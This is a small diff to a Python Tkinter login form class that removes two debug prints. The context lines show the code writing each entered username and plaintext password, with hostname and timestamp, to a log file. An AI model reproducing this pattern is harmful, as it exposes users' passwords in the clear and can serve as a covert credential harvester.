@@ -61,9 +61,6 @@ class LoginFrame(Frame):
         def add(self):
                 a = self.name.get()
                 b = self.password.get()
-                print(len(a))
-                print(len(b))
-
                 # if the entry is not blank write to log file
                 if len(a) > 0 and len(b) > 0:
                         res = 'Timestamp: ' +str(self.current_time) + ' '+ 'Hostname: ' + str(self.host)+ ' ' +'Username: ' + str(a) + ' Password: ' + str(b) + '\n'
